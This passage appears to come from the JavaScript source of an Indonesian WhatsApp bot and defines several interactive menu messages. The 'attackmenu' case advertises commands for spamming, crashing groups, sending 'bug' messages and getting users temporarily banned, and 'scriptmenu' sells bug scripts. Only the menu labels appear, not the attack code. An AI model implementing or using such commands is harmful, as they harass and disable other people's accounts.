     ヤ ◦ ᴛᴇʙᴀᴋᴊᴋᴛ48
     ヤ ◦ ᴛᴇᴋᴀᴛᴇᴋɪ
     ヤ ◦ ᴄᴀᴋʟᴏɴᴛᴏɴɢ
     ヤ ◦ sɪᴀᴘᴀᴋᴀʜᴀᴋᴜ
     ヤ ◦ ᴛᴇʙᴀᴋʟɪʀɪᴋ`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'othermenu': {
          if (!isRegistered) return reply(mess.regis)
          let xmenu_oh = `
⫹┈─────────┈⫺
*メ O T H E R M E N U メ*
⫹┈─────────┈⫺
     ヤ ◦ ᴏᴡɴᴇʀ
     ヤ ◦ ʟɪꜱᴛᴘʀᴇᴍ
     ヤ ◦ ʀᴜɴᴛɪᴍᴇ
     ヤ ◦ ᴛᴏᴛᴀʟꜰɪᴛᴜʀᴇ
     ヤ ◦ ʟɪꜱᴛɢᴄ
     ヤ ◦ ᴄᴇᴋꜱɴ
     ヤ ◦ ʀᴇᴍɪɴɪ
     ヤ ◦ ʜᴅʀ
     ヤ ◦ ʜᴅᴠɪᴅᴇᴏ
     ヤ ◦ ʜᴅᴠɪᴅ
     ヤ ◦ ʟɪᴍɪᴛ
     ヤ ◦ ᴘᴇᴍʙᴀʏᴀʀᴀɴ
     ヤ ◦ ꜱᴇᴡᴀ
     ヤ ◦ ʀᴇɢɪꜱᴛᴇʀ
     ヤ ◦ ꜱᴄʀɪᴘᴛ
     ヤ ◦ ᴘɪɴ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ɢᴄʙᴏᴛ
     ヤ ◦ ᴘʀᴏꜰɪʟᴇ
     ヤ ◦ ꜱᴛɪᴄᴋᴇʀ
     ヤ ◦ ᴄᴇᴋɢᴄ
     ヤ ◦ ɪᴅʙᴀʜᴀꜱᴀ
     ヤ ◦ ᴀꜰᴋ
     ヤ ◦ ʀᴇQᴜᴇꜱᴛ
     ヤ ◦ ʀᴇᴘᴏʀᴛʙᴜɢ`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
 case 'jkt48menu': case 'menujkt48': {
          if (!isRegistered) return reply(mess.regis)
          let xmenu_oh = `
⫹┈─────────┈⫺
*メ J K T 4 8 M E N U メ*
⫹┈─────────┈⫺
     ヤ ◦ ᴄʜʀɪsᴛʏ-ᴊᴋᴛ48
     ヤ ◦ ᴀᴅᴇʟ-ᴊᴋᴛ48
     ヤ ◦ ɪɴᴅɪʀᴀ-ᴊᴋᴛ48
     ヤ ◦ ғʀᴇʏᴀ-ᴊᴋᴛ48
     ヤ ◦ ᴍɪᴄʜɪᴇ-ᴊᴋᴛ48
     ヤ ◦ ᴊɪᴋᴏ-ᴏꜱʜɪ
     ヤ ◦ ᴛᴇʙᴀᴋᴊᴋᴛ48`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'attackmenu': {
          if (!isRegistered) return reply(mess.regis)
          let xmenu_oh = `
⫹┈─────────┈⫺
*メ A T T A C K M E N U メ*
⫹┈─────────┈⫺
     ヤ ◦ ᴛᴇᴍᴘ-ʙᴀɴ
     ヤ ◦ ꜱᴀɴᴛᴀɪ
     ヤ ◦ ʙᴜɢᴀʟʟ
     ヤ ◦ ɢᴀꜱᴄᴏᴋ
     ヤ ◦ ꜱᴘᴀᴍ
     ヤ ◦ ʙᴜɢᴡᴇʙᴘᴀɢᴇ
     ヤ ◦ ꜱᴀɴᴛᴇᴛ
     ヤ ◦ ʙᴜɢʟᴏᴋᴀꜱɪ
     ヤ ◦ ᴛᴀʜᴜ
     ヤ ◦ ʙᴀɴᴛᴀɪ 
     ヤ ◦ ꜱᴀɴᴛᴇᴛᴛʀᴏʟɪ 
     ヤ ◦ ꜱᴀɴᴛᴇᴛɪɴᴠɪᴛᴇ 
     ヤ ◦ ᴄʀᴀꜱʜɢᴄ 
     ヤ ◦ ᴛᴀʜᴜɢᴄ 
     ヤ ◦ ꜱᴀɴᴛᴇᴛɢᴄᴛʀᴏʟɪ 
     ヤ ◦ ʙᴜɢɪɴᴠɪᴛᴇɢᴄ 
     ヤ ◦ ꜱʟɪᴍᴇ
     ヤ ◦ ɢᴏʏᴀɴɢ
     ヤ ◦ ᴍɪx`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'scriptmenu': {
          if (!isRegistered) return reply(mess.regis)
          let xmenu_oh = `
⫹┈─────────┈⫺
*メ S C R I P T M E N U メ*
⫹┈─────────┈⫺
     ヤ ◦ ʙᴜʏꜱᴄ1
     ヤ ◦ ʙᴜʏꜱᴄ2
     ヤ ◦ ʙᴜʏꜱᴄ3
     ヤ ◦ ʙᴜʏꜱᴄ4
     ヤ ◦ ʙᴜʏꜱᴄ5
     ヤ ◦ ʙᴜʏꜱᴄ6
     ヤ ◦ ʙᴜʏꜱᴄ7
     ヤ ◦ ʙᴜʏꜱᴄ8
     ヤ ◦ ʙᴜʏꜱᴄ9
     ヤ ◦ ʙᴜʏꜱᴄ10
     ヤ ◦ ʙᴜʏꜱᴄ11
     ヤ ◦ ʙᴜʏꜱᴄᴊᴘᴍᴠ1
     ヤ ◦ ʙᴜʏꜱᴄᴊᴘᴍᴠ3
     ヤ ◦ ʙᴜʏꜱᴄᴊᴘᴍᴠ2
     ヤ ◦ ʙᴜʏᴍᴏᴅᴜʟᴇ
     ヤ ◦ ʙᴜʏꜱᴄᴘᴜꜱʜᴋᴏɴᴛᴀᴋ
     ヤ ◦ ʙᴜʏꜱᴄʙᴜɢᴠ3
     ヤ ◦ ʙᴜʏꜱᴄᴊᴀɢᴀɢʀᴜᴘᴠ2
     ヤ ◦ ʙᴜʏꜱᴄᴘᴜꜱʜᴀᴜᴛᴏꜱᴀᴠᴇ
     ヤ ◦ ʙᴜʏꜱᴄʙᴜɢᴠ1
     ヤ ◦ ʙᴜʏꜱᴄʙᴜɢᴠ2
     ヤ ◦ ʙᴜʏꜱᴄᴘᴜꜱʜᴀᴜᴛᴏꜱᴀᴠᴇ`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
            case 'ownermenu': {
           if (!isRegistered) return reply('Kamu belum daftar, silahkan ketik .daftar')
           let xmenu_oh = `
⫹┈─────────┈⫺
*メ O W N E R M E N U メ*
⫹┈─────────┈⫺
     ヤ ◦ ᴀᴅᴅᴘʀᴇᴍ
     ヤ ◦ ᴅᴇʟᴘʀᴇᴍ
     ヤ ◦ ʙᴄɢᴄ
     ヤ ◦ ɪᴘʙᴏᴛ
     ヤ ◦ ʟᴇᴀᴠᴇɢᴄ
     ヤ ◦ ꜱᴇᴛʙɪᴏʙᴏᴛ
     ヤ ◦ ᴅᴇʟᴇᴛᴇᴘᴘʙᴏᴛ
     ヤ ◦ ᴅᴇʟᴄʜᴀᴛ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ɪɴᴠɪᴛᴇ
     ヤ ◦ ʙᴄɪᴍɢ
     ヤ ◦ ʀᴇꜱᴛᴀʀᴛ
     ヤ ◦ ᴅᴇʟᴄᴀꜱᴇ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ꜱᴇʟꜰ
     ヤ ◦ ᴀᴅᴅʟɪᴍɪᴛ
     ヤ ◦ ʀᴇꜱᴇᴛʟɪᴍɪᴛ
     ヤ ◦ ᴅᴇʟᴄᴀꜱᴇ
     ヤ ◦ ᴀᴅᴅᴄᴀꜱᴇ
     ヤ ◦ ᴘᴜʙʟɪᴄ
     ヤ ◦ ᴀᴜᴛᴏʀᴇᴀᴅ
     ヤ ◦ ᴀᴜᴛᴏʙɪᴏ
     ヤ ◦ ɢᴇᴛᴄᴀꜱᴇ
     ヤ ◦ ʀᴇᴀᴅᴄʜᴀɴɢᴇ
     ヤ ◦ ʙɪᴏᴄʜᴀɴɢᴇ
     ヤ ◦ ꜱᴇᴛᴘᴘʙᴏᴛ
     ヤ ◦ ᴜɴʙʟᴄᴏᴋ
     ヤ ◦ ʙʟᴏᴄᴋ
     ヤ ◦ ᴄʀᴇᴀᴛᴇɢᴄ
     ヤ ◦ ʟɪꜱᴛᴘᴄ
     ヤ ◦ ᴊᴏɪɴ
     ヤ ◦ ᴀᴅᴅɢᴄ
     ヤ ◦ ᴅᴇʟɢᴄ
     ヤ ◦ ᴄʟᴇᴀʀᴀʟʟ`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case "allmenu": {
if (!isRegistered) return reply(mess.regis)
let limitz = db.data.users[m.sender].limit;
menuu = `👋🏻 allo kak, perkenalkan aku adalah *alyabot* aku di program untuk membantu owner ku, dan nama pembuat ku adalah *LynnZxD*.

untuk bisa mengakses Bot Silakan Register.

> ＩＮＦＯ ＵＳＥＲ
乂 ɴᴏᴍᴏʀ : @${m?.sender.split('@')[0]}
乂 ɴᴀᴍᴀ : ${pushname}
乂 ʟɪᴍɪᴛ : ${limitz}
乂 ꜱᴛᴀᴛᴜꜱᴜꜱᴇʀ : ${isCreator ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ꜰʀᴇᴇ'}
乂 ᴛᴇʀᴅᴀꜰᴛᴀʀ : ʏᴇꜱ
乂 ꜱᴀʟᴅᴏ : Rp ${toRupiah(cekSaldo(sender, db_saldo))}

> ＩＮＦＯ ＢＯＴ
乂 ʙᴏᴛ ɴᴀᴍᴇ : ${global.botname}
乂 ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ${global.ownername}
乂 ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}
乂 ɴᴏ ᴏᴡɴᴇʀ : https://lynnzxd.carrd.co/#
乂 ᴠᴇʀꜱɪᴏɴ : 9.0.0
乂 ᴛᴏᴛᴀʟ ꜰɪᴛᴜʀ : ${totalFitur()} ꜰɪᴛᴜʀ

kalo fitur nya ada yang error silakan hubungi
*Lynnzxd* agar owner langsung perbaiki
‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎